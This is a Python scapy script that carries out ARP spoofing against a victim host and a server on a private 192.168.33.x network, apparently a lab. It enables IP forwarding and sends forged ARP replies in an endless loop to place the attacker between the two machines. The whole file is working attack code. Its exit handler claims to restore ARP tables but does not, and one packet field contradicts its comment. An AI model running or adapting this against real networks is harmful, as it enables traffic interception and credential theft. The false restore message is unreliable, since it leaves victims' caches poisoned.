from scapy.all import *
import os
import time

from scapy.layers.l2 import ARP


def enable_ip_forwarding():
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP forwarding enabled")

def disable_ip_forwarding():
    # Disable IP forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP forwarding disabled")

def get_mac(ip, iface="eth1"):
    return getmacbyip(ip)

def spoof(victim_ip, spoof_ip, iface="eth1"):
    # Get the MAC address of the target
    target_mac = get_mac(spoof_ip)
    # Construct the ARP packet
    arp_response = ARP(pdst=victim_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send the ARP response (broadcast)
    send(arp_response, iface=iface, verbose=False)
    print("[+] Sent spoofed ARP packet: " + spoof_ip + " is-at " + get_if_hwaddr(iface) + " to " + victim_ip)

# Example usage

victim_ip = "192.168.33.30"
server_ip = "192.168.33.20"

victim_mac = get_mac(victim_ip)
server_mac = get_mac(server_ip)

print("Victim MAC: " + victim_mac)
print("server MAC: " + server_mac)

# Enable IP forwarding to ensure traffic forwarding between victim and server
enable_ip_forwarding()

try:
    while True:
        # Spoof the victim, making it think the server's IP is at the attacker's MAC
        spoof(victim_ip, server_ip)
        # Wait a short period before sending the next spoofed packet
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C! Restoring ARP tables...")
    disable_ip_forwarding()
    print("[+] ARP tables restored. Exiting.")
